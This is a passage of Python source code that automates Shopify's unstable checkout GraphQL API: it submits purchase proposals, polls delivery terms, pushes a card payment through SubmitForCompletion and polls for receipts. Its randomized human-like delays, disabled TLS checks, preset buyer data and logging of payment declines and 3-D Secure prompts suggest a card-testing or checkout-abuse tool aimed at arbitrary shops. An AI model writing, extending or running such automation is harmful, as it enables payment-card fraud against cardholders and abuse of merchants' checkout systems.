            time.sleep(SHORT_SLEEP)
            continue
    print(f"  [POLL] Timed out after {max_attempts} attempts")
    return queue_token, shipping_handle, shipping_amount, actual_total, delivery_expectations

def poll_proposal_ctx(session, checkout_token, session_token, merchandise_stable_id, shipping_handle, shop_url, variant_id, phone_required=False, shipping_amount=None, max_attempts=5):
    print(f"  [POLL] Polling for delivery expectations...")
    if not shipping_handle:
        print(f"  [POLL] No shipping handle available yet, skipping poll")
        return None, [], None
    shop_url = normalize_shop_url(shop_url or "")
    url = f"{shop_url}/checkouts/unstable/graphql?operationName=Proposal"
    headers = {
        'shopify-checkout-client': 'checkout-web/1.0',
        'shopify-checkout-source': f'id="{checkout_token}", type="cn"',
        'x-checkout-web-source-id': checkout_token,
        'x-checkout-one-session-token': session_token,
    }
    query = """query Proposal($delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$tip:TipTermInput,$note:NoteInput,$scriptFingerprint:ScriptFingerprintInput,$optionalDuties:OptionalDutiesInput,$cartMetafields:[CartMetafieldOperationInput!],$memberships:MembershipsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,tip:$tip,note:$note,scriptFingerprint:$scriptFingerprint,optionalDuties:$optionalDuties,cartMetafields:$cartMetafields,memberships:$memberships}}){__typename result{...on NegotiationResultAvailable{queueToken sellerProposal{deliveryExpectations{...on FilledDeliveryExpectationTerms{deliveryExpectations{signedHandle __typename}__typename}...on PendingTerms{pollDelay __typename}__typename}__typename}__typename}__typename}}}}"""
    delivery_line = {
        "destination": {
            "partialStreetAddress": {
                "address1": CHECKOUT_DATA["address1"],
                "city": CHECKOUT_DATA["city"],
                "countryCode": CHECKOUT_DATA["country"],
                "firstName": CHECKOUT_DATA["first_name"],
                "lastName": CHECKOUT_DATA["last_name"],
                "zoneCode": CHECKOUT_DATA["province"],
                "postalCode": CHECKOUT_DATA["zip"],
                "phone": CHECKOUT_DATA["phone"],
                "oneTimeUse": False
            }
        },
        "targetMerchandiseLines": {"lines": [{"stableId": merchandise_stable_id}]},
        "deliveryMethodTypes": ["SHIPPING"],
        "destinationChanged": False,
        "selectedDeliveryStrategy": {
            "deliveryStrategyByHandle": {
                "handle": shipping_handle,
                "customDeliveryRate": False
            },
            "options": {"phone": CHECKOUT_DATA["phone"]}
        },
        "expectedTotalPrice": {"any": True}
    }
    if shipping_amount:
        delivery_line["expectedTotalPrice"] = {"value": {"amount": str(shipping_amount), "currencyCode": "USD"}}
    billing_address_data = {
        "address1": CHECKOUT_DATA["address1"],
        "city": CHECKOUT_DATA["city"],
        "countryCode": CHECKOUT_DATA["country"],
        "firstName": CHECKOUT_DATA["first_name"],
        "lastName": CHECKOUT_DATA["last_name"],
        "zoneCode": CHECKOUT_DATA["province"],
        "postalCode": CHECKOUT_DATA["zip"],
        "phone": CHECKOUT_DATA["phone"]
    }
    payload = {
        "operationName": "Proposal",
        "query": query,
        "variables": {
            "delivery": {
                "deliveryLines": [delivery_line],
                "noDeliveryRequired": [],
                "supportsSplitShipping": True
            },
            "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
            "payment": {
                "totalAmount": {"any": True},
                "paymentLines": [],
                "billingAddress": {"streetAddress": billing_address_data}
            },
            "merchandise": {
                "merchandiseLines": [{
                    "stableId": merchandise_stable_id,
                    "merchandise": {
                        "productVariantReference": {
                            "id": f"gid://shopify/ProductVariantMerchandise/{variant_id}",
                            "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                            "properties": [],
                            "sellingPlanId": None
                        }
                    },
                    "quantity": {"items": {"value": 1}},
                    "expectedTotalPrice": {"any": True},
                    "lineComponents": []
                }]
            },
            "buyerIdentity": {
                "customer": {"presentmentCurrency": "USD", "countryCode": CHECKOUT_DATA["country"]},
                "email": CHECKOUT_DATA["email"]
            },
            "taxes": {"proposedTotalAmount": {"any": True}},
            "sessionInput": {"sessionToken": session_token},
            "tip": {"tipLines": []},
            "note": {"message": None, "customAttributes": []},
            "scriptFingerprint": {
                "signature": None,
                "signatureUuid": None,
                "lineItemScriptChanges": [],
                "paymentScriptChanges": [],
                "shippingScriptChanges": []
            },
            "optionalDuties": {"buyerRefusesDuties": False},
            "cartMetafields": [],
            "memberships": {"memberships": []}
        }
    }
    for attempt in range(max_attempts):
        print(f"  Attempt {attempt + 1}/{max_attempts}...")
        try:
            r = session.post(url, json=payload, headers=headers, timeout=HTTP_TIMEOUT_SHORT, verify=False)
        except Exception as e:
            print(f"  [ERROR] HTTP request failed: {e}")
            time.sleep(SHORT_SLEEP)
            continue
        if r.status_code == 200:
            try:
                response = r.json()
                if 'errors' in response:
                    print(f"  [ERROR] GraphQL errors:")
                    for error in response['errors']:
                        print(f"    - {error.get('message', 'Unknown')}")
                    time.sleep(2)
                    continue
                result = response.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
                seller_proposal = result.get('sellerProposal', {})
                delivery_exp_terms = seller_proposal.get('deliveryExpectations', {})
                typename = delivery_exp_terms.get('__typename')
                if typename == 'FilledDeliveryExpectationTerms':
                    print(f"  [POLL] ✓ Ready!")
                    expectations = delivery_exp_terms.get('deliveryExpectations', [])
                    delivery_expectations = []
                    for exp in expectations:
                        signed_handle = exp.get('signedHandle')
                        if signed_handle:
                            delivery_expectations.append({"signedHandle": signed_handle})
                    queue_token = result.get('queueToken')
                    actual_total = None
                    running_total = seller_proposal.get('runningTotal', {})
                    if running_total.get('__typename') == 'MoneyValueConstraint':
                        value = running_total.get('value', {})
                        actual_total = value.get('amount')
                    if not actual_total:
                        checkout_total = seller_proposal.get('checkoutTotal', {})
                        if checkout_total.get('__typename') == 'MoneyValueConstraint':
                            value = checkout_total.get('value', {})
                            actual_total = value.get('amount')
                    if actual_total:
                        print(f"  [POLL] Total: ${actual_total}")
                    print(f"  [POLL] Found {len(delivery_expectations)} expectations")
                    return queue_token, delivery_expectations, actual_total
                elif typename == 'PendingTerms':
                    poll_delay = delivery_exp_terms.get('pollDelay', 2000)
                    wait_seconds = min(poll_delay / 1000.0, 3.0)
                    time.sleep(wait_seconds)
                    continue
                else:
                    print(f"  [WARNING] Unexpected typename: {typename}")
                    time.sleep(2)
                    continue
            except Exception as e:
                print(f"  [ERROR] {e}")
                time.sleep(2)
                continue
        else:
            print(f"  [ERROR] HTTP {r.status_code}")
            time.sleep(2)
            continue
    print(f"  [POLL] Timed out after {max_attempts} attempts")
    return None, [], None

def step3_proposal_ctx(session, checkout_token, session_token, card_session_id, shop_url, variant_id):
    print("[3/5] Submitting proposal...")
    
    time.sleep(random.uniform(1.5, 2.5))
    
    shop_url = normalize_shop_url(shop_url or "")
    url = f"{shop_url}/checkouts/unstable/graphql?operationName=Proposal"
    merchandise_stable_id = str(uuid.uuid4())
    headers = {
        'shopify-checkout-client': 'checkout-web/1.0',
        'shopify-checkout-source': f'id="{checkout_token}", type="cn"',
        'x-checkout-web-source-id': checkout_token,
        'x-checkout-one-session-token': session_token,
    }
    query = """query Proposal($delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$tip:TipTermInput,$note:NoteInput,$scriptFingerprint:ScriptFingerprintInput,$optionalDuties:OptionalDutiesInput,$cartMetafields:[CartMetafieldOperationInput!],$memberships:MembershipsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,tip:$tip,note:$note,scriptFingerprint:$scriptFingerprint,optionalDuties:$optionalDuties,cartMetafields:$cartMetafields,memberships:$memberships}}){__typename result{...on NegotiationResultAvailable{queueToken sellerProposal{deliveryExpectations{...on FilledDeliveryExpectationTerms{deliveryExpectations{signedHandle __typename}__typename}...on PendingTerms{pollDelay __typename}__typename}delivery{...on FilledDeliveryTerms{deliveryLines{availableDeliveryStrategies{...on CompleteDeliveryStrategy{handle phoneRequired amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}}}}"""
    delivery_line = get_delivery_line_config(
        shipping_handle="any",
        destination_changed=True,
        merchandise_stable_id=None,
        phone_required=True
    )
    billing_address_data = {
        "address1": CHECKOUT_DATA["address1"],
        "city": CHECKOUT_DATA["city"],
        "countryCode": CHECKOUT_DATA["country"],
        "firstName": CHECKOUT_DATA["first_name"],
        "lastName": CHECKOUT_DATA["last_name"],
        "zoneCode": CHECKOUT_DATA["province"],
        "postalCode": CHECKOUT_DATA["zip"],
        "phone": CHECKOUT_DATA["phone"]
    }
    payload = {
        "operationName": "Proposal",
        "query": query,
        "variables": {
            "delivery": {
                "deliveryLines": [delivery_line],
                "noDeliveryRequired": [],
                "supportsSplitShipping": True
            },
            "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
            "payment": {
                "totalAmount": {"any": True},
                "paymentLines": [],
                "billingAddress": {"streetAddress": billing_address_data}
            },
            "merchandise": {
                "merchandiseLines": [{
                    "stableId": merchandise_stable_id,
                    "merchandise": {
                        "productVariantReference": {
                            "id": f"gid://shopify/ProductVariantMerchandise/{variant_id}",
                            "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                            "properties": [],
                            "sellingPlanId": None
                        }
                    },
                    "quantity": {"items": {"value": 1}},
                    "expectedTotalPrice": {"any": True},
                    "lineComponents": []
                }]
            },
            "buyerIdentity": {
                "customer": {"presentmentCurrency": "USD", "countryCode": CHECKOUT_DATA["country"]},
                "email": CHECKOUT_DATA["email"]
            },
            "taxes": {"proposedTotalAmount": {"any": True}},
            "sessionInput": {"sessionToken": session_token},
            "tip": {"tipLines": []},
            "note": {"message": None, "customAttributes": []},
            "scriptFingerprint": {
                "signature": None,
                "signatureUuid": None,
                "lineItemScriptChanges": [],
                "paymentScriptChanges": [],
                "shippingScriptChanges": []
            },
            "optionalDuties": {"buyerRefusesDuties": False},
            "cartMetafields": [],
            "memberships": {"memberships": []}
        }
    }
    r = session.post(url, json=payload, headers=headers, timeout=HTTP_TIMEOUT_SHORT, verify=False)
    if r.status_code == 200:
        try:
            response = r.json()
            if 'errors' in response:
                print(f"  [ERROR] GraphQL errors:")
                for error in response['errors']:
                    print(f"    - {error.get('message', 'Unknown')}")
                return None, None, None, None, None, False
            result = response.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
            if result.get('__typename') != 'NegotiationResultAvailable':
                return None, None, None, None, None, False
            queue_token = result.get('queueToken')
            seller_proposal = result.get('sellerProposal', {})
            phone_required = detect_phone_requirement(seller_proposal)
            shipping_handle = None
            shipping_amount = None
            delivery_terms = seller_proposal.get('delivery', {})
            delivery_typename = delivery_terms.get('__typename')
            if delivery_typename == 'FilledDeliveryTerms':
                delivery_lines = delivery_terms.get('deliveryLines', [])
                if delivery_lines:
                    strategies = delivery_lines[0].get('availableDeliveryStrategies', [])
                    if strategies:
                        shipping_handle = strategies[0].get('handle')
                        amount_constraint = strategies[0].get('amount', {})
                        if amount_constraint.get('__typename') == 'MoneyValueConstraint':
                            shipping_amount = amount_constraint.get('value', {}).get('amount')
                        print(f"  [OK] Shipping handle: {shipping_handle[:50] if shipping_handle else 'None'}...")
                        if shipping_amount:
                            print(f"  [OK] Shipping amount: ${shipping_amount}")
            elif delivery_typename == 'PendingTerms':
                print(f"  [INFO] Delivery terms are pending (will need to wait)")
            actual_total = None
            running_total = seller_proposal.get('runningTotal', {})
            if running_total.get('__typename') == 'MoneyValueConstraint':
                value = running_total.get('value', {})
                actual_total = value.get('amount')
            if not actual_total:
                checkout_total = seller_proposal.get('checkoutTotal', {})
                if checkout_total.get('__typename') == 'MoneyValueConstraint':
                    value = checkout_total.get('value', {})
                    actual_total = value.get('amount')
            if actual_total:
                print(f"  [OK] Total: ${actual_total}")
            delivery_expectations = []
            delivery_exp_terms = seller_proposal.get('deliveryExpectations', {})
            typename = delivery_exp_terms.get('__typename') if isinstance(delivery_exp_terms, dict) else None
            if typename == 'FilledDeliveryExpectationTerms':
                expectations = delivery_exp_terms.get('deliveryExpectations', [])
                for exp in expectations:
                    signed_handle = exp.get('signedHandle')
                    if signed_handle:
                        delivery_expectations.append({"signedHandle": signed_handle})
                print(f"  [OK] Found {len(delivery_expectations)} expectations")
            elif typename == 'PendingTerms':
                print(f"  [INFO] Expectations pending...")
                if delivery_typename == 'PendingTerms':
                    print(f"  [INFO] Both delivery and expectations pending - using comprehensive poll")
                    poll_result = poll_for_delivery_and_expectations_ctx(
                        session, checkout_token, session_token, merchandise_stable_id, shop_url, variant_id
                    )
                    if poll_result[0]:
                        queue_token_new, shipping_handle_new, shipping_amount_new, actual_total_new, delivery_expectations_new = poll_result
                        if queue_token_new:
                            queue_token = queue_token_new
                        if shipping_handle_new:
                            shipping_handle = shipping_handle_new
                        if shipping_amount_new:
                            shipping_amount = shipping_amount_new
                        if actual_total_new:
                            actual_total = actual_total_new
                        delivery_expectations = delivery_expectations_new if delivery_expectations_new else []
                        print(f"  [OK] Poll complete - Handle: {shipping_handle[:30] if shipping_handle else 'None'}...")
                    else:
                        print(f"  [WARNING] Comprehensive polling failed")
                elif shipping_handle:
                    print(f"  [INFO] Starting poll with handle: {shipping_handle[:50]}...")
                    polled_data = poll_proposal_ctx(
                        session, checkout_token, session_token, merchandise_stable_id,
                        shipping_handle, shop_url, variant_id, phone_required, shipping_amount
                    )
                    if polled_data and polled_data[0]:
                        if len(polled_data) >= 3:
                            queue_token_new, delivery_expectations_new, actual_total_new = polled_data
                            if actual_total_new:
                                actual_total = actual_total_new
                        else:
                            queue_token_new, delivery_expectations_new = polled_data
                        if queue_token_new:
                            queue_token = queue_token_new
                        delivery_expectations = delivery_expectations_new if delivery_expectations_new else []
                    else:
                        print(f"  [WARNING] Polling failed, continuing without expectations")
                else:
                    print(f"  [WARNING] No shipping handle available, skipping poll")
            print(f"  [INFO] Phone Required: {phone_required}")
            return queue_token, shipping_handle, merchandise_stable_id, actual_total, delivery_expectations, phone_required
        except json.JSONDecodeError:
            print(f"  [ERROR] Invalid JSON")
            return None, None, None, None, None, False
    else:
        print(f"  [ERROR] Failed: {r.status_code}")
        return None, None, None, None, None, False

def step4_submit_completion_ctx(session, checkout_token, session_token, queue_token,
                                shipping_handle, merchandise_stable_id, card_session_id,
                                actual_total, delivery_expectations, shop_url, variant_id, phone_required=False):
    print("[4/5] Submitting for completion...")
    print(f"  [INFO] Phone requirement: {phone_required}")
    
    time.sleep(random.uniform(2.0, 3.5))
    
    if not actual_total:
        print(f"  [INFO] No specific total amount, using 'any' constraint")
    shop_url = normalize_shop_url(shop_url or "")
    url = f"{shop_url}/checkouts/unstable/graphql?operationName=SubmitForCompletion"
    attempt_token = f"{checkout_token}-{uuid.uuid4().hex[:10]}"
    headers = {
        'shopify-checkout-client': 'checkout-web/1.0',
        'shopify-checkout-source': f'id="{checkout_token}", type="cn"',
        'x-checkout-one-session-token': session_token,
        'x-checkout-web-source-id': checkout_token,
    }
    query = """mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...on ProcessedReceipt{id __typename}...on ProcessingReceipt{id __typename}__typename}__typename}...on SubmitAlreadyAccepted{receipt{...on ProcessedReceipt{id __typename}...on ProcessingReceipt{id __typename}__typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{__typename code localizedMessage}__typename}...on Throttled{pollAfter __typename}...on SubmittedForCompletion{receipt{...on ProcessedReceipt{id __typename}...on ProcessingReceipt{id __typename}__typename}__typename}__typename}}"""
    delivery_line = get_delivery_line_config(
        shipping_handle=shipping_handle,
        destination_changed=False,
        merchandise_stable_id=merchandise_stable_id,
        use_full_address=True,
        phone_required=True
    )
    billing_address_data = {
        "address1": CHECKOUT_DATA["address1"],
        "city": CHECKOUT_DATA["city"],
        "countryCode": CHECKOUT_DATA["country"],
        "postalCode": CHECKOUT_DATA["zip"],
        "firstName": CHECKOUT_DATA["first_name"],
        "lastName": CHECKOUT_DATA["last_name"],
        "zoneCode": CHECKOUT_DATA["province"],
        "phone": CHECKOUT_DATA["phone"]
    }
    delivery_expectation_lines = []
    for exp in delivery_expectations:
        delivery_expectation_lines.append({"signedHandle": exp["signedHandle"]})
    
    if actual_total:
        payment_total_constraint = {"value": {"amount": actual_total, "currencyCode": "USD"}}
        payment_line_amount = {"value": {"amount": actual_total, "currencyCode": "USD"}}
    else:
        payment_total_constraint = {"any": True}
        payment_line_amount = {"any": True}
    
    input_data = {
        "sessionInput": {"sessionToken": session_token},
        "queueToken": queue_token,
        "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
        "delivery": {
            "deliveryLines": [delivery_line],
            "noDeliveryRequired": [],
            "supportsSplitShipping": True
        },
        "merchandise": {
            "merchandiseLines": [{
                "stableId": merchandise_stable_id,
                "merchandise": {
                    "productVariantReference": {
                        "id": f"gid://shopify/ProductVariantMerchandise/{variant_id}",
                        "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                        "properties": [],
                        "sellingPlanId": None
                    }
                },
                "quantity": {"items": {"value": 1}},
                "expectedTotalPrice": {"any": True},
                "lineComponents": []
            }]
        },
        "memberships": {"memberships": []},
        "payment": {
            "totalAmount": payment_total_constraint,
            "paymentLines": [{
                "paymentMethod": {
                    "directPaymentMethod": {
                        "paymentMethodIdentifier": "bfe4013b52b37df95b64c063a41da319",
                        "sessionId": card_session_id,
                        "billingAddress": {"streetAddress": billing_address_data},
                        "cardSource": None
                    }
                },
                "amount": payment_line_amount
            }],
            "billingAddress": {"streetAddress": billing_address_data}
        },
        "buyerIdentity": {
            "customer": {"presentmentCurrency": "USD", "countryCode": CHECKOUT_DATA["country"]},
            "email": CHECKOUT_DATA["email"],
            "emailChanged": False,
            "phoneCountryCode": "US",
            "marketingConsent": [],
            "shopPayOptInPhone": {"number": CHECKOUT_DATA["phone"], "countryCode": "US"},
            "rememberMe": False
        },
        "tip": {"tipLines": []},
        "taxes": {"proposedTotalAmount": {"any": True}},
        "note": {"message": None, "customAttributes": []},
        "localizationExtension": {"fields": []},
        "nonNegotiableTerms": None,
        "scriptFingerprint": {
            "signature": None,
            "signatureUuid": None,
            "lineItemScriptChanges": [],
            "paymentScriptChanges": [],
            "shippingScriptChanges": []
        },
        "optionalDuties": {"buyerRefusesDuties": False},
        "cartMetafields": []
    }
    if delivery_expectation_lines:
        input_data["deliveryExpectations"] = {
            "deliveryExpectationLines": delivery_expectation_lines
        }
    payload = {
        "operationName": "SubmitForCompletion",
        "query": query,
        "variables": {
            "attemptToken": attempt_token,
            "metafields": [],
            "postPurchaseInquiryResult": None,
            "analytics": {
                "requestUrl": f"{shop_url}/checkouts/cn/{checkout_token}/en-us/",
                "pageId": str(uuid.uuid4()).upper()
            },
            "input": input_data
        }
    }
    print(f"  [DEBUG] Step 4 - URL: {url}")
    print(f"  [DEBUG] Step 4 - Checkout token: {checkout_token[:20]}...")
    print(f"  [DEBUG] Step 4 - Queue token: {queue_token[:30] if queue_token else 'None'}...")
    print(f"  [DEBUG] Step 4 - Card session ID: {card_session_id[:30] if card_session_id else 'None'}...")
    print(f"  [DEBUG] Step 4 - Merchandise ID: {merchandise_stable_id[:30] if merchandise_stable_id else 'None'}...")
    print(f"  [DEBUG] Step 4 - Actual total: {actual_total}")
    print(f"  [DEBUG] Step 4 - Delivery expectations count: {len(delivery_expectations)}")
    print(f"  [DEBUG] Step 4 - Phone required: {phone_required}")
    print(f"  [DEBUG] Step 4 - Timeout: {HTTP_TIMEOUT_SHORT}s")
    
    try:
        print(f"  [DEBUG] Step 4 - Sending POST request to {url}")
        r = session.post(url, json=payload, headers=headers, timeout=HTTP_TIMEOUT_SHORT, verify=False)
        print(f"  [DEBUG] Step 4 - Response status: {r.status_code}")
        print(f"  [DEBUG] Step 4 - Response headers: {dict(list(r.headers.items())[:5])}")
    except requests.exceptions.Timeout as e:
        print(f"  [ERROR] Step 4 - HTTP request TIMEOUT after {HTTP_TIMEOUT_SHORT}s: {e}")
        print(f"  [ERROR] Step 4 - Timeout exception type: {type(e).__name__}")
        return (None, "HTTP_TIMEOUT", f"Request timed out after {HTTP_TIMEOUT_SHORT}s", {"_error": "TIMEOUT", "_message": str(e), "_timeout": HTTP_TIMEOUT_SHORT}, actual_total)
    except requests.exceptions.ConnectionError as e:
        print(f"  [ERROR] Step 4 - HTTP request CONNECTION ERROR: {e}")
        print(f"  [ERROR] Step 4 - Connection error type: {type(e).__name__}")
        return (None, "HTTP_CONNECTION_ERROR", str(e), {"_error": "CONNECTION_ERROR", "_message": str(e)}, actual_total)
    except Exception as e:
        print(f"  [ERROR] Step 4 - HTTP request FAILED: {e}")
        print(f"  [ERROR] Step 4 - Exception type: {type(e).__name__}")
        print(f"  [ERROR] Step 4 - Exception details: {repr(e)}")
        return (None, "HTTP_ERROR", str(e), {"_error": "REQUEST_EXCEPTION", "_message": str(e), "_exception_type": type(e).__name__}, actual_total)
    
    if r.status_code == 200:
        try:
            response = r.json()
            print(f"  [DEBUG] Step 4 - Response JSON parsed successfully")
        except Exception as json_err:
            print(f"  [ERROR] Step 4 - Failed to parse JSON response: {json_err}")
            print(f"  [ERROR] Step 4 - Response text (first 500 chars): {r.text[:500] if hasattr(r, 'text') else 'N/A'}")
            return (None, "JSON_PARSE_ERROR", f"Failed to parse JSON: {json_err}", {"_error": "JSON_PARSE_ERROR", "_response_preview": r.text[:500] if hasattr(r, 'text') else ""}, actual_total)
        
        result = response.get('data', {}).get('submitForCompletion', {})
        result_type = result.get('__typename', 'Unknown')
        print(f"  [INFO] Step 4 - Result type: {result_type}")
        
        if 'errors' in response:
            gql_errors = response.get('errors', [])
            print(f"  [ERROR] Step 4 - GraphQL errors found: {len(gql_errors)}")
            for idx, err in enumerate(gql_errors[:3]):
                err_msg = err.get('message', 'No message')
                err_path = err.get('path', [])
                print(f"  [ERROR] Step 4 - GraphQL error {idx+1}: {err_msg} (path: {err_path})")
        if result_type in ['SubmitSuccess', 'SubmitAlreadyAccepted', 'SubmittedForCompletion']:
            receipt = result.get('receipt', {})
            receipt_id = receipt.get('id')
            extracted_amount = None
            try:
                if actual_total:
                    extracted_amount = actual_total
            except Exception:
                pass
            if receipt_id:
                print(f"  [SUCCESS] Receipt ID: {receipt_id}")
                return (receipt_id, "SUBMIT_SUCCESS", None, response, extracted_amount)
            else:
                return ("ACCEPTED", "SUBMIT_ACCEPTED", None, response, extracted_amount)
        elif result_type == 'SubmitRejected':
            errors = result.get('errors', [])
            error_codes = []
            error_messages = []
            print(f"  [ERROR] Step 4 - SubmitRejected with {len(errors)} error(s)")
            for idx, error in enumerate(errors):
                code = error.get('code', 'UNKNOWN_ERROR')
                message = error.get('localizedMessage', 'No message')
                error_codes.append(code)
                error_messages.append(message)
                print(f"  [ERROR] Step 4 - Rejection error {idx+1}: Code={code}, Message={message}")
            primary_code = error_codes[0] if error_codes else "SUBMIT_REJECTED"
            combined_message = " | ".join(error_messages)
            print(f"  [ERROR] Step 4 - Primary error code: {primary_code}")
            return (None, primary_code, combined_message, response, actual_total)
        elif result_type == 'SubmitFailed':
            reason = result.get('reason', 'Unknown')
            print(f"  [ERROR] Step 4 - SubmitFailed with reason: {reason}")
            print(f"  [ERROR] Step 4 - Full result data: {result}")
            return (None, "SUBMIT_FAILED", reason, response, actual_total)
        elif result_type == 'Throttled':
            poll_after = result.get('pollAfter', None)
            print(f"  [WARNING] Step 4 - Throttled by Shopify (pollAfter: {poll_after})")
            return (None, "THROTTLED", f"Throttled, pollAfter: {poll_after}", response, actual_total)
        else:
            print(f"  [ERROR] Step 4 - Unexpected result type: {result_type}")
            print(f"  [ERROR] Step 4 - Full result: {result}")
            return (None, "UNEXPECTED_RESULT", f"Unexpected: {result_type}", response, actual_total)
    else:
        print(f"  [ERROR] Step 4 - HTTP {r.status_code} (not 200)")
        response_text_preview = ""
        try:
            if hasattr(r, 'text'):
                response_text_preview = r.text[:1000]
                print(f"  [ERROR] Step 4 - Response text preview (first 1000 chars): {response_text_preview}")
        except Exception:
            pass
        error_stub = {"_error": "HTTP_ERROR", "_status": r.status_code, "_text_head": response_text_preview}
        print(f"  [ERROR] Step 4 - Full error stub: {error_stub}")
        return (None, f"HTTP_{r.status_code}", f"HTTP failed: {r.status_code}", error_stub, actual_total)

def step5_poll_receipt_ctx(session, checkout_token, checkout_session_token, receipt_id, shop_url, capture_log: bool = False):
    log_lines = [] if capture_log else None
    attempt_blocks = [] if capture_log else None
    def _log(msg: str):
        try:
            if capture_log and log_lines is not None:
                log_lines.append(msg)
            print(msg)
        except Exception:
            pass
    def _compose_poll_log_text():
        if not capture_log:
            return None
        parts = []
        if attempt_blocks:
            parts.extend(attempt_blocks)
        if log_lines:
            parts.append("\n".join(log_lines))
        return "\n\n".join(parts) if parts else None
    _log("[5/5] Polling for receipt...")
    shop_url = normalize_shop_url(shop_url or "")
    url = f"{shop_url}/checkouts/unstable/graphql?operationName=PollForReceipt"
    headers = {
        'shopify-checkout-client': 'checkout-web/1.0',
        'shopify-checkout-source': f'id="{checkout_token}", type="cn"',
        'x-checkout-web-source-id': checkout_token,
        'x-checkout-one-session-token': checkout_session_token,
    }
    query = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...on ProcessedReceipt{id __typename}...on ProcessingReceipt{id pollDelay __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}...on ActionRequiredReceipt{id __typename}__typename}}"""
    payload = {
        "operationName": "PollForReceipt",
        "query": query,
        "variables": {
            "receiptId": receipt_id,
            "sessionToken": checkout_session_token
        }
    }
    try:
        rid = receipt_id
        if rid is None or (isinstance(rid, str) and not rid.strip()) or (isinstance(rid, str) and not rid.startswith("gid://shopify/")):
            _log("  [ERROR] Invalid receipt_id; skipping poll.")
            stub = {"_error": "INVALID_RECEIPT_ID", "_receipt_id": rid}
            return False, stub, _compose_poll_log_text()
    except Exception:
        stub = {"_error": "INVALID_RECEIPT_ID_EXCEPTION"}
        return False, stub, _compose_poll_log_text()
    last_response = None
    collected = []
    error_no_data_strikes = 0
    for attempt in range(1, POLL_RECEIPT_MAX_ATTEMPTS + 1):
        _log(f"  Polling {attempt}/{POLL_RECEIPT_MAX_ATTEMPTS}...")
        try:
            r = session.post(url, json=payload, headers=headers, timeout=HTTP_TIMEOUT_SHORT, verify=False)
        except Exception as e:
            stub = {"_error": "REQUEST_EXCEPTION", "_message": str(e)}
            if capture_log and attempt_blocks is not None:
                attempt_blocks.append(f"from {ordinal(attempt)} PollForReceipt\n\n" + json.dumps(stub, indent=2))
            time.sleep(SHORT_SLEEP)
            continue
        response = None
        if r.status_code == 200:
            try:
                response = r.json()
            except Exception:
                response = {"_error": "INVALID_JSON", "_status": r.status_code, "_text_head": (r.text[:2000] if isinstance(r.text, str) else "")}
            if capture_log and attempt_blocks is not None:
                try:
                    attempt_blocks.append(f"from {ordinal(attempt)} PollForReceipt\n\n" + json.dumps(response, indent=2))
                except Exception:
                    attempt_blocks.append(f"from {ordinal(attempt)} PollForReceipt\n\n{str(response)}")
            collected.append(response)
            last_response = response
            if isinstance(response, dict) and 'errors' in response and not response.get('data'):
                try:
                    errs = response.get('errors', [])
                    msg_concat = " ".join([str(e.get('message', '') or '') for e in errs if isinstance(e, dict)])
                except Exception:
                    msg_concat = ""
                if ("receiptId" in msg_concat) and (("invalid value" in msg_concat) or ("null" in msg_concat)):
                    _log("  [ERROR] Invalid receiptId reported by server; aborting poll early.")
                    return False, response, _compose_poll_log_text()
                error_no_data_strikes += 1
                if error_no_data_strikes >= 2:
                    _log("  [ERROR] Too many GraphQL errors without data; aborting poll.")
                    return False, response, _compose_poll_log_text()
                _log("  [WARN] GraphQL errors without data; will retry")
                time.sleep(SHORT_SLEEP)
                continue
            receipt = (response or {}).get('data', {}).get('receipt', {}) if isinstance(response, dict) else {}
            rtype = receipt.get('__typename')
            if rtype == 'ProcessedReceipt':
                _log("  [SUCCESS] Order completed (ProcessedReceipt).")
                _log("\n[RECEIPT_RESPONSE]")
                try:
                    _log(json.dumps({"data": {"receipt": receipt}}, indent=2))
                except Exception:
                    pass
                return True, response, _compose_poll_log_text()
            if rtype == 'ActionRequiredReceipt':
                _log("  [ACTION REQUIRED] 3-D Secure or other action required.")
                _log("\n[RECEIPT_RESPONSE]")
                try:
                    _log(json.dumps({"data": {"receipt": receipt}}, indent=2))
                except Exception:
                    pass
                return False, response, _compose_poll_log_text()
            if rtype == 'FailedReceipt':
                _log("  [FAILED] Received FailedReceipt.")
                _log("\n[RECEIPT_RESPONSE]")
                try:
                    _log(json.dumps({"data": {"receipt": receipt}}, indent=2))
                except Exception:
                    pass
                return False, response, _compose_poll_log_text()
            if rtype == 'ProcessingReceipt' or rtype is None:
